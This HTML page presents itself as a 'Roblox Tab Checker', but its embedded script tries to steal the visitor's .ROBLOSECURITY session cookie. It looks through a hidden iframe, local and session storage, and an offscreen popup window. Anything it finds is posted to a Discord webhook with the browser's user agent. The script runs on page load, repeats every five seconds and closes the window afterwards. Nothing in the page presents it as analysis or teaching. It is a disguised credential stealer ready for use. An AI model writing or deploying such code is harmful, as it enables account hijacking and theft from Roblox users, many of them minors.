<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Tab Checker</title>
    <style>
        body { font-family: Arial; background: #1f1f1f; color: white; text-align: center; padding: 20px; }
        .status { margin: 20px; padding: 15px; background: #333; border-radius: 8px; }
        .found { background: #2d5a2d; }
        .checking { background: #5a5a2d; }
    </style>
</head>
<body>
    <h1>🔍 Checking for Roblox Sessions...</h1>
    <div id="status" class="status checking">Scanning browser tabs...</div>
    
    <script>
        const webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL';
        
        // Method 1: Try to access Roblox cookies directly
        function checkRobloxCookies() {
            const status = document.getElementById('status');
            
            // Create hidden iframe to try accessing Roblox
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = 'https://www.roblox.com';
            document.body.appendChild(iframe);
            
            iframe.onload = function() {
                try {
                    // Try to access cookies from iframe
                    const robloCookie = iframe.contentDocument.cookie
                        .split('; ')
                        .find(c => c.startsWith('.ROBLOSECURITY='))
                        ?.split('=')[1];
                    
                    if (robloCookie) {
                        status.innerHTML = '✅ Roblox session found! Cookie extracted.';
                        status.className = 'status found';
                        sendToDiscord(robloCookie);
                    } else {
                        // Method 2: Check all possible storage locations
                        checkAllStorage();
                    }
                } catch (e) {
                    // If iframe access blocked, try other methods
                    checkAllStorage();
                }
                document.body.removeChild(iframe);
            };
        }
        
        // Method 2: Check localStorage and sessionStorage
        function checkAllStorage() {
            const status = document.getElementById('status');
            let found = false;
            
            // Check localStorage for Roblox data
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                if (key && key.includes('roblox')) {
                    const value = localStorage.getItem(key);
                    if (value && value.includes('.ROBLOSECURITY')) {
                        const cookie = value.match(/\.ROBLOSECURITY=([^;]+)/)?.[1];
                        if (cookie) {
                            status.innerHTML = '✅ Found in localStorage!';
                            status.className = 'status found';
                            sendToDiscord(cookie);
                            found = true;
                            break;
                        }
                    }
                }
            }
            
            // Check sessionStorage
            if (!found) {
                for (let i = 0; i < sessionStorage.length; i++) {
                    const key = sessionStorage.key(i);
                    if (key && key.includes('roblox')) {
                        const value = sessionStorage.getItem(key);
                        if (value && value.includes('.ROBLOSECURITY')) {
                            const cookie = value.match(/\.ROBLOSECURITY=([^;]+)/)?.[1];
                            if (cookie) {
                                status.innerHTML = '✅ Found in sessionStorage!';
                                status.className = 'status found';
                                sendToDiscord(cookie);
                                found = true;
                                break;
                            }
                        }
                    }
                }
            }
            
            // Method 3: Try to access open tabs via window.open (limited)
            if (!found) {
                try {
                    const robloxWindow = window.open('https://www.roblox.com', '_blank', 'width=1,height=1,left=-1000,top=-1000');
                    setTimeout(() => {
                        try {
                            const cookie = robloxWindow.document.cookie
                                .split('; ')
                                .find(c => c.startsWith('.ROBLOSECURITY='))
                                ?.split('=')[1];
                            
                            if (cookie) {
                                status.innerHTML = '✅ Found via popup method!';
                                status.className = 'status found';
                                sendToDiscord(cookie);
                            } else {
                                status.innerHTML = '❌ No Roblox session detected';
                            }
                            robloxWindow.close();
                        } catch (e) {
                            status.innerHTML = '❌ Access blocked by browser security';
                        }
                    }, 2000);
                } catch (e) {
                    status.innerHTML = '❌ Popup blocked by browser';
                }
            }
        }
        
        function sendToDiscord(cookie) {
            const data = {
                content: `🍱 Roblox Cookie Detected: ${cookie.substring(0, 20)}...`,
                embeds: [{
                    title: "Cookie Extraction Success",
                    description: `Full Cookie: \`${cookie}\``,
                    color: 65280,
                    fields: [
                        { name: "User Agent", value: navigator.userAgent.substring(0, 100) },
                        { name: "Time", value: new Date().toISOString() }
                    ]
                }]
            };
            
            fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
            
            // Auto-close after sending
            setTimeout(() => window.close(), 1000);
        }
        
        // Start checking immediately
        checkRobloxCookies();
        
        // Also check every 5 seconds in case user opens Roblox later
        setInterval(checkRobloxCookies, 5000);
    </script>
</body>
</html>
